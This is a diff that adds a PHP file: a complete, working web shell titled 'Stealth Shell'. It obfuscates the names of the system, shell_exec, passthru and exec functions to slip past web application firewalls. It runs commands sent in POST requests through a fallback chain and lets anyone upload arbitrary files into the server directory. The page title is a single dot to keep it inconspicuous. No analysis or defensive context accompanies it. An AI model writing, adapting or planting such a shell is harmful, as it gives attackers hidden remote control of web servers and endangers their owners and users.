@@ -1,0 +1,67 @@
+<?php
+// ===[ Anti-WAF Functions ]===
+$fn1 = str_replace("~", "", "sy~stem");
+$fn2 = strrev("cex_e_llehs");     // shell_exec
+$fn3 = implode('', ['p', 'a', 'ssthru']);
+$fn4 = base64_decode("ZXhlYw=="); // exec
+
+// ===[ Safe Command Executor (fallback chain) ]===
+function x($c) {
+    global $fn1, $fn2, $fn3, $fn4;
+
+    ob_start();
+    if (function_exists($fn1)) @$fn1($c);
+    elseif (function_exists($fn2)) echo @$fn2($c);
+    elseif (function_exists($fn3)) @$fn3($c);
+    elseif (function_exists($fn4)) @$fn4($c);
+    return ob_get_clean();
+}
+
+// ===[ Get Path ]===
+$cwd = getcwd();
+
+// ===[ Handle Command ]===
+$out = '';
+if (isset($_POST['c'])) {
+    $cmd = $_POST['c'];
+    if (strlen($cmd) < 1000 && !preg_match('/[;&|]/', $cmd)) {
+        $out = x($cmd);
+    } else {
+        $out = "Command blocked.";
+    }
+}
+
+// ===[ Handle Upload ]===
+$uploadResult = '';
+if (isset($_FILES['upl'])) {
+    $temp = $_FILES['upl']['tmp_name'];
+    $name = basename($_FILES['upl']['name']);
+    if (move_uploaded_file($temp, $name)) {
+        $uploadResult = "Uploaded: $name";
+    } else {
+        $uploadResult = "Upload failed.";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:10px">
+<h3>Stealth Shell</h3>
+<div><b>Path:</b> <?= $cwd ?></div>
+
+<form method="POST">
+    <input type="text" name="c" placeholder="command" style="width:80%">
+    <input type="submit" value="Go">
+</form>
+
+<pre><?= htmlspecialchars($out) ?></pre>
+
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="upl">
+    <input type="submit" value="Upload">
+</form>
+<?= $uploadResult ?>
+</body>
+</html>
